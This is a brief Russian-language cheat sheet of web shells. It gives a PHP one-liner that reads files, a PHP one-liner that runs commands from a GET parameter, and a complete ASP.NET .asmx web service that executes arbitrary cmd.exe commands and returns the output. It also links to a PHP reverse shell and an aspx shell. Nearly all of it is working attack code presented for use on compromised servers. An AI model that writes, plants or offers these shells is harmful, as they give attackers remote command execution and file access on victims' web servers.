# WebShell

## PHP

wso web shell - 1page php script с файловым менеджером

PHP Win rev shell: [https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)

Варианты попроще

### File read

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

### Command execution

```php
<?php echo system($_GET['command']); ?>
// GET /example/exploit.php?command=id HTTP/1.1
```

## ASP.NET

Основа (.asmx, .aspx)

```aspnet
<%@ WebService Language="C#" Class="MyClass" %> 
using System.Web.Services; 
using System; 
using System.Diagnostics; 
using System.IO; 

[WebService(Namespace="")] 
public class MyClass : WebService 
{ 
    [WebMethod] 
    public string Pwn_Function(string x) 
    { 
        ProcessStartInfo psi = new ProcessStartInfo(); 
        psi.FileName = "cmd.exe"; 
        psi.Arguments = "/c \""+x+"\""; 
        psi.RedirectStandardOutput = true; 
        psi.UseShellExecute = false; 
        Process p = Process.Start(psi); 
        StreamReader stmrdr = p.StandardOutput; 
        string s = stmrdr.ReadToEnd(); 
        return "PWNED" + s; 
    } 
}
```

aspx web shell [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)
